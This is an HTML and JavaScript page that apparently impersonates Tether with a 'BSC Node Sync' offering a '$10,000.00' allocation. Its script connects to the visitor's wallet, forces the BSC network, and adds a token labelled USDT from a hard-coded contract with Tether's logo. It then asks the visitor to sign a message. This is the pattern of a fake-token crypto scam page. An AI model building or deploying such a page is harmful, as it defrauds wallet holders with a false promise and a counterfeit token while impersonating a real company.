<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; margin-bottom: 20px;}
        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-img">
    <h2>BSC NODE SYNC</h2>
    <div class="price-box">
        <div style="font-size: 12px; color: #848d97;">Allocated Node Value</div>
        <div style="font-size: 24px; font-weight: bold;">$10,000.00</div>
    </div>
    <div id="log-area">SYSTEM: READY</div>
    <button class="action-btn" id="claimBtn">Sync & Receive</button>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";

    async function executeMasterSync() {
        const log = document.getElementById('log-area');
        const btn = document.getElementById('claimBtn');
        
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            log.innerText = "> REDIRECTING...";
            window.location.href = "https://link.trustwallet.com/a/dapp?url=" + window.location.href;
            return;
        }

        try {
            btn.disabled = true;
            log.innerText = "> CONNECTING...";
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            // --- THE FIX: Force Switch to BSC Network First ---
            log.innerText = "> SWITCHING TO BSC...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], 
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // --- Add Token Now (On BSC) ---
            log.innerText = "> INJECTING TOKEN...";
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: TOKEN_LOGO,
                    },
                },
            });

            log.innerText = "> VERIFYING...";
            await provider.request({
                method: 'personal_sign',
                params: ["Verify Node Synchronization", accounts[0]],
            });

            log.innerText = "> SUCCESSFUL!";
            btn.innerText = "DONE";
        } catch (err) {
            log.innerText = "> ERROR: " + (err.message || "REJECTED");
            btn.disabled = false;
        }
    }

    document.getElementById('claimBtn').onclick = executeMasterSync;
</script>
</body>
</html>
